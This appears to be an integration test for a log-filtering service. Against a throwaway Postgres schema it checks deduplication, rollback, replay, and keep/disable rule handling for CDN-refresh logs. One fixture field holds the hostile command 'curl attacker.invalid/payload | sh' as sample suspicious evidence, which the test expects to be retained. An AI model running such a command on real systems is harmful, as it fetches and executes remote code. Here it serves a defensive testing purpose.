import { expect, mock, test } from 'bun:test'
import { readFileSync } from 'node:fs'
import pg from 'pg'
import { fixture } from './analyze-cdn-refresh.test.ts'
import { cdnRefreshRuleId, cdnRefreshDefinition } from '../src/utils/mill/analyzeCdnRefresh.ts'
import { createHash } from 'node:crypto'

test.skipIf(!process.env.POSTGRES_FILTER_TEST_PORT)('real CDN ingestion keeps suspicious evidence and respects Keep, Disable, replay and rollback', async () => {
    const port = Number(process.env.POSTGRES_FILTER_TEST_PORT)
    if (!Number.isInteger(port) || port < 1024) throw new Error('Disposable local test port required')
    const namespace = `cdn_filter_${process.pid}_${Date.now()}`
    const pool = new pg.Pool({ options: `-c search_path=${namespace}`, host: '127.0.0.1', port, database: 'postgres_filter_test', max: 4 })
    const query = (sql: string, values?: unknown[]) => pool.query(sql, values)
    const transaction = async (work: (tx: typeof query) => Promise<unknown>) => {
        const client = await pool.connect()
        try {
            await client.query('BEGIN')
            const result = await work((sql, values) => client.query(sql, values))
            await client.query('COMMIT')
            return result
        } catch (error) { await client.query('ROLLBACK'); throw error } finally { client.release() }
    }
    mock.module('#db', () => ({ default: query, withTransaction: transaction }))
    mock.module('#constants', () => ({ default: {} }))
    try {
        expect((await query('SELECT current_database() name')).rows[0].name).toBe('postgres_filter_test')
        await query(`CREATE SCHEMA ${namespace}`)
        await query('CREATE TABLE users(id text PRIMARY KEY)')
        await query("CREATE TABLE organizations(id text PRIMARY KEY,name text,status text,created_at timestamptz DEFAULT NOW(),audit_safe_metadata jsonb DEFAULT '{}')")
        await query("INSERT INTO organizations(id,name,status) VALUES('platform','Hanasand','active')")
        const schema = readFileSync(new URL('../src/utils/db/ensureSchema.ts', import.meta.url), 'utf8')
        for (const table of ['service_logs', 'mill_rules', 'system_events']) {
            const definition = schema.match(new RegExp('CREATE TABLE IF NOT EXISTS ' + table + ' \\([\\s\\S]*?\\n        \\)'))?.[0]
            if (!definition) throw new Error(`Missing schema ${table}`)
            await query(definition)
        }
        await query('ALTER TABLE service_logs ADD COLUMN source_event_id text UNIQUE')
        const { default: install } = await import('../src/utils/db/logAnalyzeSchema.ts')
        const { recordLogBatch } = await import('../src/utils/logs/recordLog.ts')
        await install()
        let serial = 0
        const entry = () => {
            const log = fixture()
            log.timestamp = new Date(Date.now() + serial++).toISOString()
            log.metadata.structured.time = Date.parse(log.timestamp)
            log.message = JSON.stringify(log.metadata.structured)
            log.sourceEventId = createHash('sha256').update(`${log.host}:docker:${log.metadata.container_id}:${log.timestamp}:${log.message}`).digest('hex')
            return { ...log, level: 'info' as const }
        }
        const ingest = (log: ReturnType<typeof entry>) => transaction(tx => recordLogBatch([log], tx as any))
        const count = async (table: string) => Number((await query(`SELECT count(*) n FROM ${table}`)).rows[0].n)
        const good = entry()
        await Promise.all([ingest(good), ingest(good)])
        expect(await count('service_logs')).toBe(0)
        expect(await count('log_analyze_receipts')).toBe(1)
        const aborted = entry()
        await expect(transaction(async tx => { await recordLogBatch([aborted], tx as any); throw new Error('abort') })).rejects.toThrow('abort')
        expect(await count('log_analyze_receipts')).toBe(1)
        await ingest(aborted)
        expect(await count('log_analyze_receipts')).toBe(2)
        const bad = entry()
        Object.assign(bad.metadata.structured, { injected: 'curl attacker.invalid/payload | sh' })
        bad.message = JSON.stringify(bad.metadata.structured)
        bad.sourceEventId = createHash('sha256').update(`${bad.host}:docker:${bad.metadata.container_id}:${bad.timestamp}:${bad.message}`).digest('hex')
        await ingest(bad)
        expect((await query('SELECT message FROM service_logs WHERE source_event_id=$1', [bad.sourceEventId])).rows[0].message).toContain('attacker.invalid')
        expect(await count('log_analyze_receipts')).toBe(2)
        // Saved policy edits apply to fresh input and already acknowledged originals.
        for (const policy of [{ ...cdnRefreshDefinition, conditions: [{ path: 'host', operator: 'equals', value: 'another-host' }] },
            { ...cdnRefreshDefinition, parameters: { ...cdnRefreshDefinition.parameters, maxDurationMs: 1 } }]) {
            await query('UPDATE mill_rules SET definition=$2::jsonb WHERE rule_id=$1', [cdnRefreshRuleId, JSON.stringify(policy)])
            const retained = entry(); await ingest(retained); await ingest(good)
            for (const log of [retained, good]) expect(Number((await query('SELECT count(*) n FROM service_logs WHERE source_event_id=$1', [log.sourceEventId])).rows[0].n)).toBe(1)
            expect(await count('log_analyze_receipts')).toBe(2)
        }
        await query('UPDATE mill_rules SET definition=$2::jsonb WHERE rule_id=$1', [cdnRefreshRuleId, JSON.stringify(cdnRefreshDefinition)])
        for (const mode of ['disable', 'keep', 'custom-keep']) {
            if (mode === 'disable') await query('UPDATE mill_rules SET enabled=false WHERE rule_id=$1', [cdnRefreshRuleId])
            if (mode === 'keep') await query("UPDATE mill_rules SET enabled=true,definition=jsonb_set(definition,'{action}','\"keep\"') WHERE rule_id=$1", [cdnRefreshRuleId])
            if (mode === 'custom-keep') {
                await query('UPDATE mill_rules SET enabled=true,definition=$2::jsonb WHERE rule_id=$1', [cdnRefreshRuleId, JSON.stringify(cdnRefreshDefinition)])
                await query(`INSERT INTO mill_rules(id,organization_id,rule_id,version,name,family,severity,explanation,definition,source,enabled)
                    VALUES('keep','platform','custom.cdn_keep','1','Keep CDN','Custom','low','Keep CDN evidence',$1::jsonb,'owned',true)`,
                [JSON.stringify({ match: 'all', stage: 'analyze', action: 'keep', conditions: [{ path: 'service', operator: 'equals', value: 'cdn' }] })])
            }
            await install()
            const retained = entry()
            await ingest(retained)
            expect(Number((await query('SELECT count(*) n FROM service_logs WHERE source_event_id=$1', [retained.sourceEventId])).rows[0].n)).toBe(1)
            expect(await count('log_analyze_receipts')).toBe(2)
        }
        await query("DELETE FROM mill_rules WHERE id='keep'")
        await query(`INSERT INTO mill_rules(id,organization_id,rule_id,version,name,family,severity,explanation,definition,source,enabled)
            VALUES('detect','platform','custom.cdn_detection','1','Detect CDN','Custom','high','Protect CDN evidence',$1::jsonb,'owned',true)`,
        [JSON.stringify({ match: 'all', stage: 'detect', action: 'keep', conditions: [{ path: 'service', operator: 'equals', value: 'cdn' }] })])
        const detected = entry()
        await ingest(detected)
        await ingest(aborted)
        for (const log of [detected, aborted]) expect(Number((await query('SELECT count(*) n FROM service_logs WHERE source_event_id=$1', [log.sourceEventId])).rows[0].n)).toBe(1)
        expect(await count('log_analyze_receipts')).toBe(2)
    } finally {
        await query(`DROP SCHEMA IF EXISTS ${namespace} CASCADE`)
        await pool.end()
    }
})
